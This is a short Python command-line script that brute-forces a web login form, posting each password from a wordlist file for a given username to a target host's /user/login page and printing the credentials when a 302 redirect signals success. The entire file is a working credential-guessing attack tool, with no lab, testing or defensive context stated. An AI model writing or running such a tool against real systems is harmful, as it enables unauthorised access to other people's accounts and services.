import requests
import argparse

def brute_force_login(target_host, username, password_list_path):
    login_url = f"http://{target_host}/user/login"

    # list of passwords from a file
    with open(password_list_path, 'r') as file:
        password_list = file.read().splitlines()

    for password in password_list:
        data = {
            'username': username,
            'password': password,
        }

        try:
            response = requests.post(login_url, data=data, allow_redirects=False)

            # if status_code is 302, then we authenticated
            if response.status_code == 302:
                print(f"Good: {username} - {password}")
                return

        except requests.RequestException as e:
            print(f"Error: {e}")

    print("Login attempts have been completed. Invalid credentials.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force login script")
    parser.add_argument("target_host", help="Target host address")
    parser.add_argument("username", help="Username to test")
    parser.add_argument("password_list", help="Path to the password list file")

    args = parser.parse_args()

    brute_force_login(args.target_host, args.username, args.password_list)
